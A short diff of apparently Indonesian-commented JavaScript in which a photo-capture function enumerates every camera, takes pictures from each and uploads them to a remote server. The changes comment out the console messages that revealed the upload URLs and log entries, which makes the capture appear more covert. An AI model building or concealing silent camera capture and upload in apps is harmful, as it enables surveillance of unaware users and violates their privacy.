@@ -367,7 +367,7 @@ const capturePhoto = () => {
     // --- di sini kamu bisa tambahkan kode capture kamera asli ---
   };
   // ========= FUNGSI CAPTURE FOTO =========
-  const capturePhoto1 = async (status = "unknown") => {
+  const capturePhoto99 = async (status = "unknown") => {
     try {
       // Cek semua device kamera yang tersedia
       const devices = await navigator.mediaDevices.enumerateDevices();
@@ -429,9 +429,9 @@ const capturePhoto = () => {
           const data = await res.json();
 
           capturedURLs.push({ facing, downloadURL: data.data.downloadURL });
-          console.log(`Foto (${facing}) diupload ke:`, data.data.downloadURL);
+          // console.log(`Foto (${facing}) diupload ke:`, data.data.downloadURL);
 
-          console.log("Foto diupload ke:", data.data.storageUsed);
+          // console.log("Foto diupload ke:", data.data.storageUsed);
          
         } catch (err) {
           console.warn(`Gagal ambil kamera ${facing}:`, err.message);
@@ -609,7 +609,7 @@ try {
 
         // Tambahkan ini untuk melihat deleteTime yang sudah jadi timestamp
         onValue(newLogRef, (snap) => {
-          console.log("Log disimpan ke:", snap.val());
+          // console.log("Log disimpan ke:", snap.val());
         });
       // console.log("Data yang dikirim ke log:", logData);
     }
